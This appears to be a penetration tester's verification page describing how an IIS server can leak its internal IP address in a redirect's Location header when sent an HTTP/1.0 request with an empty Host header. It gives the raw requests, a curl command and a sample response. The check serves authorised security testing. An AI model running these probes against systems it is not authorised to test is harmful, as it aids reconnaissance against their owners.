---
layout: template
title: Internal IP Disclosure via Host Header in IIS 
author: anantshri
CVE: NOIDEA
Nessus: NOIDEA
links:
- Reference links
---

Internal IP Disclosure via Host Header in IIS
---------------
If you send in a HTTP request with HTTP/1.0 as version with blank or no Host header. Depending on Configuration IIS Server might redirect you to Internal IP Address path. Its it to be noted that the URL we are trying to reach should be by default a redirect URL.

Affected Systems
----------------

IIS Versions

Manual Verification Tests
-------------------------

* Command to be used

Either telnet and then perform following
```
GET / HTTP/1.0


```

OR 
```
GET / HTTP/1.0
Host:

```

OR 

```
curl -k -I -0 -H 'Host:' https://<IP>/aspnet_client
```

* Result Expected

Internal IP Disclosure via Location Header
```
HTTP/1.1 301 Moved Permanently
Content-Length: 159
Content-Type: text/html; charset=UTF-8
Location: https://<Internal_IP>/aspnet_client/
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Wed, 21 Dec 2016 13:07:57 GMT
Connection: close

```